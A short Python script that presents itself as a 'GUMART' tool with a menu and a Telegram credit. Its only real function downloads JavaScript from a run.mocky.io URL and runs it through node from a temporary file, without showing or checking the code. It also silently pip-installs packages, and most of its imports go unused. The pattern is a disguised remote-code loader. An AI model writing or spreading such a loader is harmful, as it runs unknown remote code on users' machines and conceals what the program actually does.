import os
import sys
import time
import shutil
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import uuid
import json
import requests
import socket
import subprocess
import tempfile

try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style, init
    from random import randint
    import pystyle
except ImportError:
    os.system("pip install faker requests colorama pystyle")

from pystyle import Add, Center, Anime, Colors, Colorate, Write

# Define color codes
PINK = '\033[38;5;13m'
RED = '\033[38;5;9m'
YELLOW = '\033[38;5;11m'
GREEN = '\033[38;5;10m'
LIGHT_PINK = '\033[38;5;207m'
BLINK = '\033[5m'
RESET = '\033[0m'
FLAME_ORANGE = '\033[38;5;208m'
SILVER = '\033[38;5;231m'

# Initialize colorama
init(autoreset=True)

def banner():
    # Placeholder for your banner function
    print(f"Please choose an option")

def check_internet_connection():
    try:
        # Try connecting to a well-known website
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

def run_node_script(script_content):
    # Create a temporary file to save the Node.js script
    with tempfile.NamedTemporaryFile(delete=False, suffix='.js') as temp_file:
        temp_file.write(script_content.encode('utf-8'))
        temp_file_path = temp_file.name

    try:
        # Run the Node.js script using the Node.js runtime
        result = subprocess.run(['node', temp_file_path], capture_output=True, text=True)
        print(f"Node.js script output:\n{result.stdout}")
        if result.stderr:
            print(f"Node.js script errors:\n{result.stderr}")
    finally:
        # Clean up the temporary file
        os.remove(temp_file_path)

try:
    while True:
        banner()
        print(f"GUMART 🛒 code by 🐮")
        print(f"Telegram: tphuc_0")
        print(f"GUMART 🛒  (1)")
        chon = input(f"Enter number (1) to run or (0) to exit: ")

        if chon == '0':
            print(f"Program ended...")
            break
        elif chon == '1':
            if check_internet_connection():
                try:
                    response = requests.get('https://run.mocky.io/v3/4658ac0b-608c-44b6-b97e-e6e1582af656')
                    response.raise_for_status()  # Check for HTTP errors
                    run_node_script(response.text)
                except requests.RequestException as e:
                    print(f"Network error: {e}")
            else:
                print(f"No network connection. Please check your connection.")
        else:
            print(f"Please enter only numbers")
except KeyboardInterrupt:
    print(f"\nProgram ended...")
